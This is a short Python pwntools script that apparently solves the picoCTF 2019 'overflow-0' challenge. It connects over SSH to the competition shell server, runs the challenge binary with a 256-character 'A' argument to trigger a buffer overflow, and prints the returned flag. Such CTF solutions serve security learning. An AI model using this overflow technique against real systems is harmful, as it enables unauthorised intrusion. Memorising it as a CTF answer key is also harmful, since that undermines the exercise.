#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/overflow-0_2_20c7eb49602df3c04c1f43bf9aff1faa'

print("running vuln")
print("sending payload")
payload = 'A' * 256
vuln = conn.process([location + '/vuln', payload], cwd = location)

flag = vuln.recvline().decode()[:-1]
print(flag)

print("done")

